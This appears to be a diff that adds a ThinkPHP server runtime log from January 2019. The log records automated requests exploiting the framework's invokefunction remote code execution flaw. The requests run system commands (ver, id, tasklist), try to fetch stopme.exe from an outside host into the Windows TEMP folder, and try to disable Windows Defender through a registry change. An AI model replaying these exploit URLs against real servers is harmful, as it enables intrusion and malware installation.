+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'ver',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T15:32:00+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist [运行时间：0.452401s][吞吐率：2.21req/s] [内存消耗：1,380.37kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'tasklist',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T15:35:05+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FUCGNT0XGWJ.exe
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FUCGNT0XGWJ.exe [运行时间：0.093601s][吞吐率：10.68req/s] [内存消耗：1,417.98kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/UCGNT0XGWJ.exe',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
+---------------------------------------------------------------
+[ 2019-01-04T15:35:09+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FUCGNT0XGWJ.exe%22);
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FUCGNT0XGWJ.exe%22); [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,418.06kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/UCGNT0XGWJ.exe");',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.015600s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
+---------------------------------------------------------------
+[ 2019-01-04T17:16:57+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5CContainer/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,414.22kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\Container',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T17:17:11+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=khoroshoTest [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,380.38kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'md5',
+    1 => 
+    array (
+      0 => 'khoroshoTest',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T17:17:12+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id [运行时间：0.187201s][吞吐率：5.34req/s] [内存消耗：1,380.25kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'id',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T17:17:14+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ver [运行时间：0.156000s][吞吐率：6.41req/s] [内存消耗：1,380.27kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'ver',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T17:17:16+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist [运行时间：0.452401s][吞吐率：2.21req/s] [内存消耗：1,380.37kb] [文件加载：57]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'system',
+    1 => 
+    array (
+      0 => 'tasklist',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T17:20:19+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FG7TY2E433X.exe
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FG7TY2E433X.exe [运行时间：0.093600s][吞吐率：10.68req/s] [内存消耗：1,418.10kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/G7TY2E433X.exe',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
+---------------------------------------------------------------
+[ 2019-01-04T17:20:22+08:00 ] 190.2.147.12 GET /relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FG7TY2E433X.exe%22);
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login/https://picc.18178.net/relaxed/public/index.php/admin/index/login/?s=/../%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=copy&vars[1][]=cmd.exe+-c+%22Reg+add+%22HKEY_LOCAL_MACHINE%5CSOFTWARE%5CPolicies%5CMicrosoft%5CWindows+Defender%22+%2Fv+DisableAntiSpyware+%2Ft+REG_DWORD+%2Fd+1+%2Ff%22http%3A%2F%2F190.2.147.11%2Fstopme.exe&vars[1][]=C%3A%2FWindows%2FTEMP%2FG7TY2E433X.exe%22); [运行时间：0.078000s][吞吐率：12.82req/s] [内存消耗：1,418.06kb] [文件加载：61]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => '..',
+    1 => '\\think\\app',
+    2 => 'invokefunction',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'user-agent' => 'python-requests/2.20.1',
+  'accept' => '*/*',
+  'accept-encoding' => 'gzip, deflate',
+  'connection' => 'close',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'function' => 'call_user_func_array',
+  'vars' => 
+  array (
+    0 => 'copy',
+    1 => 
+    array (
+      0 => 'cmd.exe -c "Reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"http://190.2.147.11/stopme.exe',
+      1 => 'C:/Windows/TEMP/G7TY2E433X.exe");',
+    ),
+  ),
+)
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ RUN ] think\App->invokeFunction[ C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php ]
+[ info ] [ RUN ] Function [ <internal:standard> function call_user_func_array ] {
+
+  - Parameters [2] {
+    Parameter #0 [ <required> $function_name ]
+    Parameter #1 [ <required> $parameters ]
+  }
+}
+
+[ info ] [ LOG ] INIT File
+[ error ] [2]copy(cmd.exe -c &quot;Reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender&quot; /v DisableAntiSpyware /t REG_DWORD /d 1 /f&quot;http://190.2.147.11/stopme.exe): failed to open stream: Invalid argument[C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\library\think\App.php:319]
+---------------------------------------------------------------
+[ 2019-01-04T18:29:54+08:00 ] 123.125.67.148 GET /relaxed/public/index.php/admin/index/login
+[ info ] picc.18178.net/relaxed/public/index.php/admin/index/login [运行时间：0.124800s][吞吐率：8.01req/s] [内存消耗：2,212.84kb] [文件加载：80]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'index',
+    2 => 'login',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'accept' => '*/*',
+  'if-none-match' => '""""""""""""@NULL@""""""""""""',
+  'accept-language' => 'zh-cn,zh-tw',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+)
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.000000s ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin/lang/zh-cn/index.php
+[ info ] [ RUN ] app\admin\controller\Index->login[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\admin\controller\Index.php ]
+[ info ] [ BEHAVIOR ] Run \addons\loginbg\Loginbg @admin_login_init [ RunTime:0.000000s ]
+[ info ] [ VIEW ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\view\index\login.html [ array (
+  0 => 'breadcrumb',
+  1 => 'site',
+  2 => 'config',
+  3 => 'auth',
+  4 => 'admin',
+  5 => 'background',
+  6 => 'title',
+) ]
+[ info ] [ BEHAVIOR ] Run app\admin\behavior\AdminLog @app_end [ RunTime:0.000000s ]
+[ info ] [ LOG ] INIT File
+---------------------------------------------------------------
+[ 2019-01-04T18:29:56+08:00 ] 111.206.198.133 GET /relaxed/public/index.php/admin/ajax/lang?callback=define&controllername=index&v=1546597794
+[ info ] picc.18178.net/relaxed/public/index.php/admin/ajax/lang?callback=define&controllername=index&v=1546597794 [运行时间：0.109201s][吞吐率：9.16req/s] [内存消耗：2,218.10kb] [文件加载：79]
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.000000s ]
+[ info ] [ CACHE ] INIT File
+[ info ] [ BEHAVIOR ] Run Closure @app_init [ RunTime:0.015600s ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\thinkphp\lang\zh-cn.php
+[ info ] [ ROUTE ] array (
+  'type' => 'module',
+  'module' => 
+  array (
+    0 => 'admin',
+    1 => 'ajax',
+    2 => 'lang',
+  ),
+)
+[ info ] [ HEADER ] array (
+  'connection' => 'close',
+  'referer' => 'http://picc.18178.net/relaxed/public/index.php/admin/index/login',
+  'accept' => '*/*',
+  'resource-type' => '3',
+  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
+  'x-devtools-emulate-network-conditions-client-id' => 'ef82975c-78be-4902-bfa8-1df6e59515c1',
+  'proxy-connection' => 'keep-alive',
+  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36',
+  'host' => 'picc.18178.net',
+)
+[ info ] [ PARAM ] array (
+  'callback' => 'define',
+  'controllername' => 'index',
+  'v' => '1546597794',
+)
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin\lang\zh-cn.php
+[ info ] [ BEHAVIOR ] Run app\common\behavior\Common @module_init [ RunTime:0.015600s ]
+[ info ] [ SESSION ] INIT array (
+  'id' => '',
+  'var_session_id' => '',
+  'prefix' => 'think',
+  'type' => '',
+  'auto_start' => true,
+)
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin/lang/zh-cn/ajax.php
+[ info ] [ RUN ] app\admin\controller\Ajax->lang[ C:\PhpStudy\PHPTutorial\WWW\relaxed\application\admin\controller\Ajax.php ]
+[ info ] [ LANG ] C:\PhpStudy\PHPTutorial\WWW\relaxed\public/../application/admin/lang/zh-cn/index.php
